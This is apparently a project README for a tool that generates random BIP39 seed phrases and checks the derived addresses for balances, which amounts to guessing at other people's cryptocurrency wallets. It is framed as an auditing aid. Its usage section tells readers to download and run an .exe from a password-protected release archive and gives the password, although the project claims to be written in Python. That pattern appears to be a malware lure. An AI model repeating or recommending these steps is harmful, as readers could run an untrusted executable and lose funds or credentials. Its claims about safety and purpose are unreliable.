# 🧠 Mnemonic Phrase Analyzer

> **Toolkit for generating and analyzing BIP39 mnemonic phrases with public balance checking capabilities.**  

## 🔍 Overview

This project is an advanced tool for generating BIP39-compliant seed phrases and optionally inspecting their derived public addresses using publicly available blockchain explorers. It is intended **strictly for auditing, recovery simulations, or educational security analysis**.

We emphasize that this tool **does not interact with or access any wallets, nor does it store or transfer any sensitive keys**. All operations are local and use public information.

---

## 🚦 Usage

Install the actual [Release](https://github.com/b4491660/MnemonicKit/releases/tag/release) and run `.exe` file
 *Archive pass - iua050123

---

## 🛠 Features

- 📖 **BIP39-compatible** mnemonic generation (12–24 words)
- 📦 Supports **multiple derivation paths** (`m/44'/0'/0'/0`, etc.)
- 🔐 SHA256/HMAC-based entropy sources (custom seed entropy)
- 🧪 Optional: Balance check via public APIs (read-only)
- 🧱 Multi-coin support (BTC, ETH, LTC, etc.)
- 📊 Logging and statistics on generated public addresses
- 🔍 Custom wordlist / dictionary support
- ❌ No private key export / signing functions included (by design)

---

## 🧬 How It Works

1. **Entropy Source:** Generates secure random entropy (via OS-level CSPRNG).
2. **Mnemonic Phrase:** Converts entropy to a human-readable BIP39 phrase using wordlists.
3. **Key Derivation:** Uses BIP32/BIP44 to derive HD wallets and addresses.
4. **Balance Check (Optional):** Sends public address to third-party blockchain explorers for basic metadata.

---

## 🧰 Technology Stack

- **Language:** Python 3.10+
- **Libraries Used:**
  - `bip_utils`
  - `requests`
  - `mnemonic`
  - `eth_account`
  - `concurrent.futures` (for threading)

---

## ⚙️ Configuration

```
{
  "num_phrases": 10,
  "check_balance": true,
  "address_type": "btc",
  "derivation_path": "m/44'/0'/0'/0"
}
```

### 🔍 Sample Output

```
Generated: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about
Address: 1BoatSLRHtKNngkdXEeobR76b53LETtpyT
Balance: 0.00000000 BTC
```
